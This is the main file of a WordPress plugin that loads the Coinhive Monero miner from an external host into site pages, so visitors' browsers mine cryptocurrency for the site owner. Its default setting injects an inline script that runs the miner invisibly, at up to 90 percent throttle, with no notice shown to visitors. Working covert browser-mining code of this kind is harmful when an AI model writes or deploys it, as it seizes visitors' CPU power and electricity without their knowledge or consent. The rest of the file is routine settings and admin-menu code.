<?php
/*
Plugin Name: Simple Monero Miner - Coin Hive
Description: Alternative way to earn money by mining monero (a cryptocurrency coin) on visitors CPU using coinhive api.
Version: 1.3.1
Author: Thiyagesh M
Author URI: thyash11.github.io
*/

if ( ! defined( 'ABSPATH' ) ) exit;

function smmChSetOptions() {
	add_option('smmch_setup','0');
	
	add_option('smmch_public_sitekey','');
	add_option('smmch_private_sitekey','');
	add_option('smmch_throttle','0.3');
	add_option('smmch_visual','0');
	add_option('smmch_block_for_mobile','on');
	add_option('smmch_disable_plugin','');
	
	add_option('smmch_topbottom_pos','bottom');
	add_option('smmch_notification_pos','bottom right');
	add_option('smmch_visual_title','Support Me');
	add_option('smmch_visual_desc','Hi! You can now help to keep this website alive by using some of your excess CPU power! You can stop if you need!');
	add_option('smmch_visual_text_color','#ffffff');
	add_option('smmch_visual_bg_color','#000000');
	add_option('smmch_visual_button_color','#000000');
	add_option('smmch_visual_button_bg_color','#ffffff');
	add_option('smmch_mining_perct','Mining Percentage:');
	add_option('smmch_accepted_hashes','Total Accepted Hashes:');
	add_option('smmch_visual_hide_time','10');
	add_option('smmch_first_session','');
	add_option('smmch_hide_hashes_infmn','');
	add_option('smmch_hide_hashes_contrl','');
}
function smmChReSetOptions(){
	
}
function smmChAdminRegisterSettings() {
	register_setting('smmch_skip','smmch_setup');
	register_setting('smmch_options','smmch_public_sitekey');
	register_setting('smmch_options','smmch_private_sitekey');
	register_setting('smmch_options','smmch_throttle');
	register_setting('smmch_options','smmch_visual');
	register_setting('smmch_options','smmch_disable_plugin');
	register_setting('smmch_options','smmch_block_for_mobile');
	
	register_setting('smmch_visual_control','smmch_topbottom_pos');
	register_setting('smmch_visual_control','smmch_notification_pos');
	register_setting('smmch_visual_control','smmch_visual_title');
	register_setting('smmch_visual_control','smmch_visual_desc');
	register_setting('smmch_visual_control','smmch_visual_text_color');
	register_setting('smmch_visual_control','smmch_visual_bg_color');
	register_setting('smmch_visual_control','smmch_visual_button_color');
	register_setting('smmch_visual_control','smmch_visual_button_bg_color');
	register_setting('smmch_visual_control','smmch_mining_perct');
	register_setting('smmch_visual_control','smmch_accepted_hashes');
	register_setting('smmch_visual_control','smmch_visual_hide_time');
	register_setting('smmch_visual_control','smmch_first_session');
	register_setting('smmch_visual_control','smmch_hide_hashes_infmn');
	register_setting('smmch_visual_control','smmch_hide_hashes_contrl');
}
/*---ACTIVATION, DEACTIVATION HOOKS, ADMIN OPTION REGISTER SETTINGS--*/
register_activation_hook(__FILE__, 'smmChSetOptions' );
register_deactivation_hook(__FILE__, 'smmChReSetOptions' );
add_action('admin_init', 'smmChAdminRegisterSettings');

function smmChSettings(){
	if(get_option('smmch_setup') == 0){
		require_once( plugin_dir_path( __FILE__ ) . 'includes/smmch-setup.php' );
	} ?>
	<br/>
	<div class="smmch-config">
		<h1>Simple Monero Miner - Coin Hive</h1>
		<div class="left-side-box">
			<div class="smmchshadow-box">
				<?php require_once( plugin_dir_path( __FILE__ ) . 'includes/smmch-settings.php' ); ?>
			</div>
			<?php require_once( plugin_dir_path( __FILE__ ) . 'includes/smmch-visual.php' ); ?>
			<div class="smmchshadow-box">
				<?php require_once( plugin_dir_path( __FILE__ ) . 'includes/smmch-stats.php' ); ?>
			</div>
		</div>
		<div class="right-side-box">
			<?php require_once( plugin_dir_path( __FILE__ ) . 'includes/smmch-features.php' ); ?>
		</div>
	</div> <?php
}

/*---Admin Menu and Plugin Action Links---*/
function smmChMenu() {
  add_options_page('Monero Miner | Admin Settings', 'Simple Monero Miner', 'administrator', 'simple-monero-miner-coin-hive', 'smmChSettings');
}
add_filter('admin_menu', 'smmChMenu');

function smmchAddActionLinks ( $actions, $plugin_file ) {
	static $plugin;
	if (!isset($plugin))
		$plugin = plugin_basename(__FILE__);
	
	if ($plugin == $plugin_file) {
		$mylinks = array('<a href="' . admin_url( 'options-general.php?page=simple-monero-miner-coin-hive' ) . '"><img style="vertical-align: middle;width:15px;height:15px;border:0;" src="'.plugin_dir_url(__FILE__).'img/monero-coin.png">Settings</a>');
		$actions = array_merge( $mylinks, $actions );
	}
	return $actions;
}
add_filter( 'plugin_action_links', 'smmchAddActionLinks', 10, 5 );

/*---ADMIN CSS---*/
function smmChAdminRegisterHead() {
	wp_enqueue_style( 'wp-color-picker' );
	wp_enqueue_script( 'wp-color-picker' );
	wp_enqueue_style( 'smmch-admin-style', plugin_dir_url( __FILE__ ) . 'css/smmch-custom.css?v=1.3');
	wp_enqueue_script( 'smmch-admin-script', plugin_dir_url( __FILE__ ) . 'js/smmch-custom.js?v=1.3', array(jquery) );
}
add_action('admin_enqueue_scripts', 'smmChAdminRegisterHead');

/*---COIN HIVE SCRIPT ENQUEUER---*/
function smmCHCoinhiveScript() {
	
	$smmch_publickey = get_option('smmch_public_sitekey');
	$smmch_throttle = number_format((float)get_option('smmch_throttle'), 1, '.', '');
	
	$smmch_visual = esc_attr(get_option('smmch_visual'));
	$smmch_block_for_mobile = esc_attr(get_option('smmch_block_for_mobile'));
	$smmch_disable_plugin = esc_attr(get_option('smmch_disable_plugin'));
	
	if($smmch_disable_plugin != "on"){
		if($smmch_visual != '5'){
			wp_enqueue_script('smmch-coinhive-script','https://coin-hive.com/lib/coinhive.min.js',array());
			/*add coinhive script*/
			wp_enqueue_script( 'smmch-miner-script', plugin_dir_url(__FILE__) . 'js/smmch-mine.js?v=1.3', array(jquery) );
		}
		if($smmch_visual == '0'){
			if($smmch_throttle != 1) {
				if($smmch_publickey != ''){
					if ($smmch_throttle) {
						if($smmch_throttle > 0.9) {
							$smmch_throttle = 0.9;
						}
					} else {
						$smmch_throttle = "";
					}
					wp_add_inline_script(
					'smmch-coinhive-script',
					'smmchMineOptions = {}; smmchMineOptions.invisible="true"; smmchMineOptions.sitekey = "' . esc_textarea($smmch_publickey).'"; smmchMineOptions.throttle = "' . esc_textarea($smmch_throttle) .'"; smmchMineOptions.mobileblock = "' . esc_textarea($smmch_block_for_mobile) .'";',
					'after');
				}
			}
		}
	}
}
add_action('wp_footer', 'smmCHCoinhiveScript');

/*---COIN HIVE STYLE ENQUEUER---*/
function smmCHCoinhiveStyle() {
	wp_enqueue_style( 'smmch-public-style', plugin_dir_url( __FILE__ ) . 'css/smmch-public.css?v=1.3');
}
add_action('wp_head', 'smmCHCoinhiveStyle');

require_once( plugin_dir_path( __FILE__ ) . 'includes/smmch-widget.php' );
require_once( plugin_dir_path( __FILE__ ) . 'includes/smmch-authedmine-widget.php' );
require_once( plugin_dir_path( __FILE__ ) . 'includes/smmch-footer.php' );
require_once( plugin_dir_path( __FILE__ ) . 'includes/smmch-shortcode.php' );